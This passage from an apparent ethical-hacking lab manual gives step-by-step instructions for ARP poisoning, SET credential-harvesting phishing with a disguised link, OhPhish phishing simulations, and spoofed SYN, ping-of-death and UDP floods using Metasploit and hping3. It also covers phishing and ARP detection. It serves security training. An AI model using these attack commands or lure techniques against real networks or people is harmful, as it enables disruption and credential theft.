In the Analysis Project 1 - Colasoft Capsa Enterprise Trial window check the checkbox beside the available adapter (here, Ethernet) and click on Start.

16.jpg

The Analysis Project 1 - Colasoft Capsa Enterprise Trial window appears, as shown in the screenshot.

17.jpg

Navigate to the Diagnosis tab in the Analysis Project 1 - Colasoft Capsa Enterprise Trial window.

18.jpg

Click on Parrot Security to switch to Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

19.jpg

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

20.jpg

In the terminal window, type habu.arp.poison 10.10.1.11 10.10.1.13 and press Enter, to start ARP poisoning on Windows 11 machine.

The above command sends ARP 'is-at' packets to the specified victim(s), poisoning their ARP tables to send their traffic to the attacker system.

If you receive any error while running the command ignore it.

21.jpg

Click Windows 11 to switch to Windows 11 machine.

In the Diagnosis tab, expand the Data Link Layer node to see the ARP Too Many Unrequested Replies warning.

It will take approximately 10 minutes for the tool to capture the ARP requests.

22.jpg

Click on ARP Too Many Unrequested Replies warning under Data Link Layer node.

Right-click on any Security warning under Details section and select Resolve Address… from the context menu.

23.jpg

An Address Resolver pop-up appears, once the address resolving completes click on OK.

24.jpg

Now to locate the Parrot Machine's IP address click on All Diagnosis option under Events section.

Now select Parrot Security machine's IP address from the list (here, 10.10.1.13) and double-click on it.

Here, the IP address of the Parrot Security machine is the attacker's IP address.

25.jpg

The IP - Behaviour Analysis10.10.1.13 - Analysis Project1 window appears, as shown in the screenshot. Now click on Packet tab in the Analysis Project 1 - Colasoft Capsa Enterprise Trial window, to check the packets transferred by the Parrot Security machine.

26.jpg

After completing the analysis, close the IP - Behaviour Analysis10.10.1.13 - Analysis Project1 window and return back to Analysis Project 1 - Colasoft Capsa Enterprise Trial window. Now click on Analaysis Settings(N) from the menu bar and select Diagnosis from the drop down options.

27.jpg

In the Analysis Settings window check the checkbox beside Diagnosis node under Analysis Settings option in the left hand pane to select the Diagnosis settings.

28.jpg

Now check the checkbox beside Log option In the Analysis Settings window, check the Save log to disk checkbox and click the ellipsis button under File path option.

29.jpg 30.jpg

In the Select Folder window, select Desktop and click on Select Folder.

31.jpg

Ensure that csv file radio button is selected under Save As section and select 1 minute under Split file every: section (this option directly saves a new log file in the specified location for every 1 minute), leave all the other settings as default and click OK.

32.jpg

We can see that the csv log file is created in Desktop -> log_diagnosis location.

33.jpg

This concludes the demonstration of detecting ARP poisoning using the Capsa Network Analyzer.

Close all open windows and document all the acquired information.

########
Module 09 - Social Engineering
########

========
Task 1: Sniff Credentials using the Social-Engineer Toolkit (SET)
========

Here, we will sniff user credentials using the SET.

Click on Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Type cd social-engineer-toolkit and press Enter to navigate to the setoolkit folder.

Screenshot

Now, type ./setoolkit and press Enter to launch Social-Engineer Toolkit.

If a Do you agree to the terms of service [y/n] question appears, enter y and press Enter.

Screenshot

The SET menu appears, as shown in the screenshot. Type 1 and press Enter to choose Social-Engineering Attacks

Screenshot

A list of options for Social-Engineering Attacks appears; type 2 and press Enter to choose Website Attack Vectors.

Screenshot

A list of options in Website Attack Vectors appears; type 3 and press Enter to choose Credential Harvester Attack Method.

Screenshot

Type 2 and press Enter to choose Site Cloner from the menu.

Screenshot

Type the IP address of the local machine (10.10.1.13) in the prompt for “IP address for the POST back in Harvester/Tabnabbing” and press Enter.

In this case, we are targeting the Parrot Security machine (IP address: 10.10.1.13).

Now, you will be prompted for the URL to be cloned; type the desired URL in “Enter the url to clone” and press Enter. In this task, we will clone the URL http://www.moviescope.com.

You can clone any URL of your choice.

Screenshot

If a message appears that reads Press {return} if you understand what we’re saying here, press Enter.

After cloning is completed, a highlighted message appears. The credential harvester initiates, as shown in the screenshot.

Screenshot

Having successfully cloned a website, you must now send the IP address of your Parrot Security machine to a victim and try to trick him/her into clicking on the link.

Click Firefox icon from the top-section of the Desktop to launch a web browser window and open your email account (in this example, we are using Mozilla Firefox and Gmail, respectively). Log in, and compose an email.

You can log in to any email account of your choice.

After logging into your email account, click the Compose button in the left pane and compose a fake but enticing email to lure a user into opening the email and clicking on a malicious link.

A good way to conceal a malicious link in a message is to insert text that looks like a legitimate MovieScope URL (in this case), but that actually links to your malicious cloned MovieScope page.

Position the cursor just above Regards to place the fake URL, then click the Insert link icon.

inserlink1.png

In the Edit Link window, first type the actual address of your cloned site in the Web address field under the Link to section. Then, type the fake URL in the Text to display field. In this case, the actual address of our cloned MovieScope site is http://10.10.1.13, and the text that will be displayed in the message is http://www.moviescope.com/avail_benefits; click OK.

benefits.png

The fake URL should appear in the message body, as shown in the screenshot.

Verify that the fake URL is linked to the correct cloned site: in Gmail, click the link; the actual URL will be displayed in a “Go to link” pop-up. Once verified, send the email to the intended user.

2022-04-12_15-12-29.png

Click Windows 11 to switch to the Windows 11 machine and click Ctrl+Alt+Delete. By default, Admin user profile is selected, click Pa$$w0rd paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

If Welcome to Windows wizard appears, click Continue and in Sign in with Microsoft wizard, click Cancel.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open any web browser (here, we are using Mozilla Firefox), sign in to the email account to which you sent the phishing mail as an attacker. Open the email you sent previously and click to open the malicious link.

2022-04-12_15-18-22.png

When the victim (you in this case) clicks the URL, a new tab opens up, and he/she will be presented with a replica of www.moviescope.com.

The victim will be prompted to enter his/her username and password into the form fields, which appear as they do on the genuine website. When the victim enters the Username and Password and clicks Login, he/she will be redirected to the legitimate MovieScope login page. Note the different URLs in the browser address bar for the cloned and real sites.

2022-04-12_15-20-08.png

If save credentials notification appears, click Don't Save.

2022-04-12_15-21-22.png

Now, click Parrot Security to switch back to the Parrot Security machine and switch to the terminal window.

As soon as the victim types in his/her Username and Password and clicks Login, SET extracts the typed credentials. These can now be used by the attacker to gain unauthorized access to the victim’s account.

Scroll down to find Username and Password displayed in plain text, as shown in the screenshot.

2022-04-12_15-22-41.png

This concludes the demonstration of phishing user credentials using the SET.

Close all open windows and document all the acquired information.

========
Lab 2: Detect a Phishing attack
========

========
Task 1: Detect Phishing using Netcraft
========

Here, we will use the Netcraft Extension to detect phishing sites.

Click on the Windows 11 to switch to the Windows 11 machine.

First, it is necessary to install the Netcraft extension. Launch any browser, in this lab we are using Mozilla Firefox. In the address bar of the browser place your mouse cursor, type https://www.netcraft.com/apps/ and press Enter.

The Netcraft website appears, as shown in the screenshot.

Click Accept in the cookie notification in the lower section of the browser.

Screenshot

Scroll-down and click Find out more button under BROWSER option on the webpage.

Screenshot

Click ellipses icon ( 2022-04-12_15-32-17.png) from the top-right corner of the webpage and click Download button.

2022-04-12_15-30-34.png

Click ellipses icon ( 2022-04-12_15-32-17.png) again to close the menu.

You will be directed to the Get it now section; click the Firefox browser icon.

Screenshot

On the next page, click the Add to Firefox button to install the Netcraft extension.

Screenshot

When the Add Netcraft Extension? notification pop-up appears on top of the window, click Add.

If the Netcraft Extension has been added to Firefox pop-up appears in the top section of the browser, click Okay.

Screenshot

After the installation finishes, you may be asked to restart the browser. If so, click Restart Now.

If Netcraft Extension has been added to Firefox notification appears, click Okay, Got it.

The Netcraft Extension icon now appears on the top-right corner of the browser, as shown in the screenshot.

Screenshots may differ with newer versions of Firefox.

Screenshot

Now, In the address bar of the browser place your mouse cursor, type http://www.certifiedhacker.com/ and press Enter.

The certifiedhacker.com webpage appears. Click the Netcraft Extension icon in the top-right corner of the browser. A dialog box appears, displaying a summary of information such as Risk Rating, Site rank, First seen, and Host about the searched website.

Screenshot

Now, click the Site Report link from the dialog-box to view a report of the site.

Screenshot

The Site report for certifiedhacker.com page appears, displaying detailed information about the site such as Background, Network, IP Geolocation, SSL/TLS and Hosting History

If a Site information not available pop-up appears, ignore it.

Screenshot

Screenshot

Screenshot

If you attempt to visit a website that has been identified as a phishing site by the Netcraft Extension, you will see a pop-up alerting you to Suspected Phishing.

Now, in the browser window open a new tab, type https://smbc.ctad-co.com/m and press Enter.

Here, for demonstration purposes, we are using https://smbc.ctad-co.com/m phishing website to trigger Netcraft Extension to obtain desired results. You can use the same website or any other website to perform this task.

The Netcraft Extension automatically blocks phishing sites. However, if you trust the site, click Visit anyway to browse it; otherwise, click Report mistake to report an incorrectly blocked URL.

If you are getting an error in opening the website (https://smbc.ctad-co.com/m), try to open other phishing website.

OR

You will get a Suspected Phishing page in the Firefox browser.

If you get Secure Connection Failed webpage, then use some other phishing website to get the result, as shown in the screenshot.

Screenshot

This concludes the demonstration of detecting phishing using Netcraft Extension.

Close all open windows and document all the acquired information.

Task 2: Detect Phishing using PhishTank
PhishTank is a free community site on which anyone can submit, verify, track, and share phishing data. As the official website notes, “it is a collaborative clearing house for data and information about phishing on the Internet.” PhishTank provides an open API for developers and researchers to integrate anti-phishing data into their applications.

In this task, we will use PhishTank to detect phishing.

In the Windows 11 machine, Launch any browser, in this lab we are using Mozilla Firefox. In the address bar of the browser place your mouse cursor, type https://www.phishtank.com and press Enter.

The PhishTank webpage appears, displaying a list of phishing websites under Recent Submissions.

Click on any phishing website ID in the Recent Submissions list (in this case, 7486626) to view detailed information about it.

If a notification appears asking Would you like Firefox to save this login for phishtank.com?, click Don’t Save.

If you are redirected to the page asking captcha, enter the captcha to proceed.

Screenshot

If the site is a phishing site, PhishTank returns a result stating that the website “Is a phish,” as shown in the screenshot.

Screenshot

Navigate back to the PhishTank home page by clicking the Back button in the top-left corner of the browser.

In the Found a phishing site? text field, type a website URL to be checked for phishing (in this example, the URL entered is be-ride.ru/confirm). Click the Is it a phish? button.

Screenshot

You can examine any website of your choice for phishing.

If the site is a phishing site, PhishTank returns a result stating that the website “Is a phish,” as shown in the screenshot.

Screenshot

This concludes the demonstration of detecting phishing using PhishTank.

========
Lab 3: Audit Organization's Security for Phishing Attacks
========

========
Task 1: Audit Organization's Security for Phishing Attacks using OhPhish
========

Here, we will audit the organization’s security infrastructure for phishing attacks using OhPhish.

Before starting this task, you must activate your OhPhish account.

Open any web browser (here, Mozilla Firefox). Log in to your ASPEN account and navigate to Certified Ethical Hacker v12 in the My Courses section.

If you do not have an ASPEN account or access to CEHv12 program on ASPEN, please write to support@eccouncil.org for an OhPhish account. Once your account is setup, you will receive an email from aware@eccouncil.org with an account activation link. Upon activation, continue from STEP 12.

Click on Click here hyperlink in the OhPhish notification above My Courses section.

1111.png

You will be redirected to the OhPhish Sign Up page. Enter the remaining personal details, check I’m not a robot checkbox and click Complete Signup button.

2.png

Account creation Alert! appears, click OK.

Now, open your email account given during registration process. Open an email from OhPhish and in the email, click CLICK HERE TO LOGIN button.

3.png

EC-Council Aware page appears, in the Username field enter your email address and click Next. In the next page, enter your password in the Password field and click Sign In.

If Save login for ohphish.com? notification appears, click Don’t Save.

2022-04-12_18-12-03.png

2022-04-12_18-17-50.png

You will be redirected to Reset Password page, enter the new password in both the fields and click Reset Password button to reset the password.

5.png

Your account password is changed successfully.

Now, you can login to your OhPhish account either by clicking on the LOGIN TO OHPHISH PORTAL button in your ASPEN account under My Courses section or you can navigate to the OhPhish website (https://portal.ohphish.com/login) and login using your credentials.

Once you login to your OhPhish account you will be redirected to the OhPhish Dashboard.

In the OhPhish Dashboard, click on the Entice to Click option.

2022-04-12_18-20-33.png

The Create New Email Phishing Campaign form appears.

If the OhPhish Helpdesk notification appears in the right corner of the dashboard, close it.

Almost Done pop-up appears, click DISCARD CHANGES.

In the Campaign Name field, enter any name (here, Test - Entice to Click). In the Select Template Category field, select Coronavirus/COVID-19 from the drop-down list.

Ensure that the Existing Template is selected in the Email Template option.

In the Select Country field, leave the default option selected (All).

In the Select Template field, click the Select Template button and select Work From Home: COVID-19 from the drop-down list.

Click the Select button in the Select Template field to select the template.

The template selected notification appears below the Select Template field.

2022-04-13_16-20-39.png

Leave fields such as Sender Email, Sender Name, Subject, Select Time Zone, Expiry Date, and Schedule Later set to their default values, as shown in the screenshot.

You can change the above-mentioned options if you want to.

In the Import users field, click Select Source.

2022-04-13_16-22-56.png

Import Users pop-up appears, click to select Quick Add option from the list of options.

2022-04-13_16-23-44.png

The Import Users Info pop-up appears; enter the details of the employee and click Add.

2022-04-13_16-25-36.png

Similarly, you can add the details of multiple users. Here, we added two users.

After adding the users’ details, click Import.

2022-04-13_16-27-32.png

In the Batch Count and Batch Interval fields, set the values to 1.

Batch Count: indicates how many you want to send emails to at one time; Batch Interval: indicates at what interval (in minutes) you want to send emails to a batch of users.

The values of Batch Count and Batch Interval might differ depending on the number of users you are sending phishing emails to.

Leave the Landing Page field set to its default value.

2022-04-13_16-29-42.png

Now, scroll down to the end of the page and click Create to create the phishing campaign.

2022-04-13_16-30-25.png

Add to your Whitelist pop-up appears, click Done.

You must ensure that messages received from specific IP addresses do not get marked as spam. Do this by adding the addresses to an email whitelist in your Google Admin console. To do that, you can refer the whitelisting guide available for Microsoft O365 and G-Suite user accounts.

2022-04-13_16-31-22.png

The Confirm? pop-up appears; click SURE.

2020-09-11_22-09-22.jpg

A count down timer appears and phishing campaign initiates in ten seconds.

The Alert! pop-up appears, indicating successful initiation of a phishing campaign; click OK.

2022-04-13_16-32-39.png

Now, we must open the phishing email as a victim (here, an employee of the organization). To do so, click Windows Server 2019 to switch to the Windows Server 2019 machine.

Screenshot

Click on Ctrl+Alt+Delete to activate it, by default, Administrator profile is selected click Pa$$w0rd to enter password in to the machine and press Enter to login.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open any web browser (here, Mozilla Firefox) and then open the email client provided while creating the phishing campaign (here, Gmail).

After you login to your Gmail account, search for an email with the subject WFH Under Organizational Policy in the Inbox.

Depending on the security implementations of your organization, for example, if proper spam filters are enabled, this phishing email will end up in the Spam folder.

If the email is not present in the Inbox folder, then check your Spam folder.

Click on the WFH - Policy.pdf link in the email.

2022-04-13_16-36-49.png

A Warning - phishing suspected page appears, as shown in the screenshot.

You can further click report an incorrect warning link to whitelist the link.

Screenshot

Close the current tab.

Now, click Windows 11 to switch back to the Windows 11 machine.

Click on the Test – Entice to Click campaign present on the OhPhish Dashboard. You can observe that one person has clicked the link.

Refresh the Ohphish dashboard page, if the clicked value is still 0.

2022-04-13_16-42-10.png

The Campaign Detailed Report page appears, displaying the Campaign Details and Campaign Summary sections.

In the Campaign Summary section, you can observe that the values of No. of targets who have clicked the link (defaulters) and No. of Targets who have opened the mail are both 1 (here, we have opened only one email account).

2022-04-13_16-45-29.png

Now, click Home in the left pane to navigate back to the OhPhish Dashboard.

In the OhPhish Dashboard, click on the Send Attachment option.

2022-04-13_16-46-32.png

The Create New Email Phishing Campaign form appears.

Almost Done pop-up appears, click DISCARD CHANGES.

In the Campaign Name field, enter any name (here, Test – Send to Attachment). In the Select Template Category field, select Office Mailers from the drop-down list.

Ensure that the Existing templates button is selected in the Email Template field.

In the Select Country field, leave the default option selected (All).

In the Select Template field, select the PF Amount Credited option from the drop-down list and then click the Select button.

Leave fields such as Sender Email, Sender Name, Subject, Select Time Zone, Expiry Date, and Schedule Later set to their default values, as shown in the screenshot.

You can change the above-mentioned options if you want to.

In the Attachment field, enter any name (here, PFinfo).

2022-04-13_16-54-07.png

Click Select Source button under Import users field.

Import Users pop-up appears, click to select the Quick Add option from the list of options.

2022-04-13_16-55-21.png

The Import Users Info pop-up appears; enter the details of the employee and click Add.

2022-04-13_16-56-41.png

Similarly, you can add the details of multiple users. Here, we added two users.

After adding the users’ details, click Import.

In the Batch Count and Batch Interval fields, set the values to 1.

The values of Batch Count and Batch Interval might differ depending on the number of users you are sending phishing emails to.

Leave the Landing Page field set to its default value.

Scroll down to the end of the page and click Create to create the phishing campaign.

2022-04-13_16-58-42.png

Add to your Whitelist pop-up appears, click Done.

You must ensure that messages received from specific IP addresses do not get marked as spam. Do this by adding the addresses to an email whitelist in your Google Admin console. To do that, you can refer the whitelisting guide available for Microsoft O365 and G-Suite user accounts.

The Confirm? pop-up appears; click SURE.

A count down timer appears and phishing campaign initiates in ten seconds.

The Alert! pop-up appears, indicating successful initiation of a phishing campaign; click OK.

Now, click Windows Server 2019 to switch to the Windows Server 2019 machine.

If you are logged out of the Windows Server 2019 machine, click Ctrl+Alt+Delete, then login into Administrator user profile using Pa$$w0rd as password.

In the Gmail account opened previously, navigate to the Inbox folder.

You will find an email from HR – ABP News, as shown in the screenshot.

Click on the EPF – KYC Documents Upload Centre hyperlink present in the email.

2020-09-11_22-54-29.jpg

If a Suspicious link pop-up appears, click Proceed.

You will be re-directed to the Oh You’ve been Phished landing page, as shown in the screenshot.

Screenshot

Now, click Windows 11 to switch back to the Windows 11 machine.

Click on the Test – Send to Attachment campaign present on the OhPhish Dashboard.

2020-09-11_22-57-14.jpg

The Campaign Detailed Report page appears, displaying the Campaign Details and Campaign Summary sections.

In the Campaign Summary section, you can observe that the value of No. of targets who have clicked the link (defaulters) is 1. Click on 1 icon to see the defaulter.

2020-09-11_22-58-18.jpg

The Campaigns Users page appears, displaying the details of the defaulter, such as Risk Score, Credentials, IP Address, Location, etc., as shown in the screenshot.

2020-09-11_23-01-09.jpg

Now, click to expand the Reports section in the left pane and select the Executive Summary Report option.

2020-09-11_23-02-49.jpg

The Campaign Report page appears; select any phishing campaign from the drop-down list (here, Test – Send to Attachment) and click on the Export icon to export the report.

2020-09-11_23-04-41.jpg

The Opening Phishing-Simulation-Test window appears; select the Save File radio button and click OK.

2020-09-11_23-06-03.jpg

The file is downloaded to the default location (here, Downloads). Navigate to the download location and double-click the Phishing-Simulation-Test---Send-Attachment file to open it.

Screenshot

The executive phishing report appears in the document, as shown in the screenshot.

If Microsoft Word pop-up appears, click OK. In the second Microsoft Word pop-up, click Yes.

You can also explore other report options such as Department Wise Report, Designation Wise Report, and Branch Wise Report.

Screenshot

Screenshot

Screenshot

If you have an upgraded OhPhish account you can also explore other phishing methods such as Credential Harvesting, Training, Vishing and Smishing.

This concludes the demonstration of auditing an organization's security for phishing attacks using OhPhish.

Close all the open windows and document all the acquired information.

########
Module 10: Denial of Service
########

========
Lab 1: Perform DoS and DDoS Attacks using Various Techniques
========

In this lab, you will gain hands-on experience in auditing network resources against DoS and DDoS attacks.

Lab Objectives

Perform a DoS attack (SYN flooding) on a target host using Metasploit
Perform a DoS attack on a target host using hping3
Perform a DoS attack using Raven-storm
Perform a DDoS attack using HOIC
Perform a DDoS attack using LOIC
Overview of DoS and DDoS Attacks

DDoS attacks mainly aim at the network bandwidth; they exhaust network, application, or service resources, and thereby restrict legitimate users from accessing their system or network resources.

In general, the following are categories of DoS/DDoS attack vectors:

Volumetric Attacks: Consume the bandwidth of the target network or service

Attack techniques:

UDP flood attack
ICMP flood attack
Ping of Death and smurf attack
Pulse wave and zero-day attack
Protocol Attacks: Consume resources like connection state tables present in the network infrastructure components such as load-balancers, firewalls, and application servers

Attack techniques:

SYN flood attack
Fragmentation attack
Spoofed session flood attack
ACK flood attack
Application Layer Attacks: Consume application resources or services, thereby making them unavailable to other legitimate users

Attack techniques:

HTTP GET/POST attack
Slowloris attack
UDP application layer flood attack
DDoS extortion attack
Tasks 1: Perform a DoS Attack (SYN Flooding) on a Target Host using Metasploit
SYN flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system. The process of transmitting such packets is faster than the system can handle. Normally, the connection establishes with the TCP three-way handshake, and the host keeps track of the partially open connections while waiting in a listening queue for response ACK packets.

Metasploit is a penetration testing platform that allows a user to find, exploit, and validate vulnerabilities. Also, it provides the infrastructure, content, and tools to conduct penetration tests and comprehensive security auditing. The Metasploit framework has numerous auxiliary module scripts that can be used to perform DoS attacks.

Here, we will use the Metasploit tool to perform a DoS attack (SYN flooding) on a target host.

In this task, we will use the Parrot Security (10.10.1.13) machine to perform SYN flooding on the Windows 11 (10.10.1.11) machine through port 21.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine..

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

If a Question pop-up window appears asking for you to update the machine, click No to close the window.
Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

First, determine whether port 21 is open or not. This involves using Nmap to determine the state of the port.

On the Parrot Terminal window, type nmap -p 21 (Target IP address) (here, target IP address is 10.10.1.11 [Windows 11]) and press Enter.

-p: specifies the port to be scanned.

The result appears, displaying the port status as open, as shown in the screenshot.

Screenshot

Now, we will perform SYN flooding on the target machine (Windows 11) using port 21.

In this task, we will use an auxiliary module of Metasploit called synflood to perform a DoS attack on the target machine.

Type msfconsole from a command-line terminal and press Enter to launch msfconsole.

Screenshot

In the msf command line, type use auxiliary/dos/tcp/synflood and press Enter to launch a SYN flood module.

Screenshot

Now, determine which module options need to be configured to begin the DoS attack.

Type show options and press Enter. This displays all the options associated with the auxiliary module.

Screenshot

Here, we will perform SYN flooding on port 21 of the Windows 11 machine by spoofing the IP address of the Parrot Security machine with that of the Windows Server 2019 (10.10.1.19) machine.

Issue the following commands:

set RHOST (Target IP Address) (here, 10.10.1.11)
set RPORT 21
set SHOST (Spoofable IP Address) (here, 10.10.1.19)
By setting the SHOST option to the IP address of the Windows Server 2019 machine, you are spoofing the IP address of the Parrot Security machine with that of Windows Server 2019.

Screenshot

Once the auxiliary module is configured with the required options, start the DoS attack on the Windows 11 machine.

To do so, type exploit and press Enter. This begins SYN flooding the Windows 11 machine.

Screenshot

To confirm, click Windows 11 to switch to the Windows 11 machine and click Ctrl+Alt+Delete. By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

If Welcome to Windows wizard appears, click Continue and in Sign in with Microsoft wizard, click Cancel.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Click Search icon ( search14icon.jpg) on the Desktop. Type wireshark in the search field, the Wireshark appears in the results, click Open to launch it.

Screenshot

The Wireshark Network Analyzer window appears. Double-click on the primary network interface (here, Ethernet) to start capturing the network traffic.

The network interface might differ when you perform the task.

Screenshot

Wireshark displays the traffic coming from the machine. Here, you can observe that the Source IP address is that of the Windows Server 2019 (10.10.1.19) machine. This implies that the IP address of the Parrot Security machine has been spoofed.

Screenshot

Observe that the target machine (Windows 11) has drastically slowed, implying that the DoS attack is in progress on the machine. If the attack is continued for some time, the machine’s resources will eventually be completely exhausted, causing it to stop responding.

Once the performance analysis of the machine is complete, click on Parrot Security to switch to the Parrot Security machine and press Ctrl+C to terminate the attack.

Screenshot

This concludes the demonstration of how to perform SYN flooding on a target host using Metasploit.

Close all open windows and document all the acquired information.

========
Task 2: Perform a DoS Attack on a Target Host using hping3
========

hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols.

It performs network security auditing, firewall testing, manual path MTU discovery, advanced traceroute, remote OS fingerprinting, remote uptime guessing, TCP/IP stacks auditing, and other functions.

Here, we will use the hping3 tool to perform DoS attacks such as SYN flooding, Ping of Death (PoD) attacks, and UDP application layer flood attacks on a target host.

Click Windows 11 to switch to the Windows 11 machine. On the Windows 11 machine, Click Search icon ( search14icon.jpg) on the Desktop. Type wireshark in the search field, the Wireshark appears in the results, click Open to launch it.

Screenshot

The Wireshark Network Analyzer window appears. Double-click on the primary network interface (here, Ethernet) to start capturing the network traffic.

Screenshot

Wireshark starts capturing the packets; leave it running.

Screenshot

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

The terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

A Parrot Terminal window appears; type hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood and press Enter.

Here, the target IP address is 10.10.1.11 [Windows 11], and the spoofable IP address is 10.10.1.19 [Windows Server 2019]

-S: sets the SYN flag; -a: spoofs the IP address; -p: specifies the destination port; and --flood: sends a huge number of packets.

Screenshot

This command initiates the SYN flooding attack on the Windows 11 machine. After a few seconds, press Ctrl+C to stop the SYN flooding of the target machine.

If you send the SYN packets for a long period, then the target system may crash.

Observe how, in very little time, the huge number of packets are sent to the target machine.

Screenshot

hping3 floods the victim machine by sending bulk SYN packets and overloading the victim’s resources.

Click Windows 11 to switch to the Windows 11 machine and observe the TCP-SYN packets captured by Wireshark.

Screenshot

Now, observe the graphical view of the captured packets. To do so, click Statistics from the menu bar, and then click the I/O Graph option from the drop-down list.

Screenshot

The Wireshark . IO Graphs . Ethernet window appears, displaying the graphical view of the captured packets. Observe the huge number of TCP packets captured by Wireshark, as shown in the screenshot.

Screenshot

After analyzing the I/O Graph, click Close to close the Wireshark . IO Graphs . Ethernet window.

Close the Wireshark main window. If an Unsaved packets… pop-up appears, click Stop and Quit without Saving.

Screenshot

Now, we shall perform a PoD attack on the target system.

Now, click Parrot Security to switch to the Parrot Security machine. In the Terminal window, type hping3 -d 65538 -S -p 21 --flood (Target IP Address) (here, the target IP address is 10.10.1.11 [Windows 11]) and press Enter.

-d: specifies data size; -S: sets the SYN flag; -p: specifies the destination port; and --flood: sends a huge number of packets.

Screenshot

This command initiates the PoD attack on the Windows 11 machine.

In a PoD attack, the attacker tries to crash, freeze, or destabilize the targeted system or service by sending malformed or oversized packets using a simple ping command.

For example, the attacker sends a packet that has a size of 65,538 bytes to the target web server. This packet size exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes. The receiving system’s reassembly process might cause the system to crash.

hping3 floods the victim machine by sending bulk packets, and thereby overloading the victim’s resources.

Click Windows 11 to switch to the Windows 11 machine.

Click Search icon ( search14icon.jpg) on the Desktop. Type wireshark in the search field, the Wireshark appears in the results, click Open to launch it.

4uhufcxp.jpg

The Wireshark Network Analyzer window appears. Double-click on the primary network interface (here, Ethernet) to start capturing the network traffic.

w3napw1i.jpg

Observe the large number of packets captured by Wireshark.

q1h0g4ni.jpg

You can observe the degradation in the performance of the system.

The results might differ when you perform the task.

Click Parrot Security to switch to the Parrot Security machine. In the Terminal window, press Ctrl+C to terminate the PoD attack using hping3.

Screenshot

Now, we shall perform a UDP application layer flood attack on the Windows Server 2019 machine using NetBIOS port 139. To do so, first, determine whether NetBIOS port 139 is open or not.

In the terminal window, type nmap -p 139 (Target IP Address) (here, the target IP address is 10.10.1.19 [Windows Server 2019]) and press Enter.

Here, we will use NetBIOS port 139 to perform a UDP application layer flood attack.

Screenshot

Now, type hping3 -2 -p 139 --flood (Target IP Address) (here, the target IP address is 10.10.1.19 [Windows Server 2019]) and press Enter.

-2: specifies the UDP mode; -p: specifies the destination port; and --flood: sends a huge number of packets.

Screenshot

Click Windows Server 2019 to switch to the Windows Server 2019 machine, click Ctrl+Alt+Delete to activate the machine. By default, Administrator account is selected, click Pa$$w0rd to enter the password and press Enter to log in.

Screenshot

In the Type here to search field on the Desktop, type wireshark in the search field, the Wireshark appears in the results, click Wireshark to launch it.

You might experience degradation in the Window Server 2019 machine’s performance.

Screenshot

The Wireshark Network Analyzer window appears. Double-click on the primary network interface (here, Ethernet 2) to start capturing the network traffic.

The network interface might differ when you perform the task.

Screenshot

Wireshark displays the network’s flow of traffic. Here, observe the huge number of UDP packets coming from the Source IP address 10.10.1.13 via port 139.

Screenshot

Click Parrot Security to switch to the Parrot Security machine. In the Terminal window, press Ctrl+C to terminate the DoS attack.

Here, we have used NetBIOS port 139 to perform a UDP application layer flood attack. Similarly, you can employ other application layer protocols to perform a UDP application layer flood attack on a target network.

Some of the UDP based application layer protocols that attackers can employ to flood target networks include:

CharGEN (Port 19)
SNMPv2 (Port 161)
QOTD (Port 17)
RPC (Port 135)
SSDP (Port 1900)
CLDAP (Port 389)
TFTP (Port 69)
NetBIOS (Port 137,138,139)
NTP (Port 123)
Quake Network Protocol (Port 26000)
VoIP (Port 5060)
Screenshot

This concludes the demonstration of how to perform DoS attacks (SYN flooding, PoD attacks, and UDP Application Layer Flood Attacks) on a target host using hping3.

Close all open windows and document all the acquired information.

========
Task 3: Perform a DoS Attack using Raven-storm
========

Raven-Storm is a DDoS tool for penetration testing that features Layer 3, Layer 4, and Layer 7 attacks. It is written in python3 and is effective and powerful in shutting down hosts and servers. It can be used to perform strong attacks and can be optimized for non typical targets.

Here, we will use Raven-storm tool to perform a DoS attack.

Click Parrot Security switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

If a Question pop-up window appears asking for you to update the machine, click No to close the window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Type sudo rst and press Enter to start Raven-storm tool.

Screenshot

Raven-storm tool initializes, as shown in the screenshot.

Screenshot

Type l4 and press Enter to load layer4 module (UDP/TCP).

Screenshot

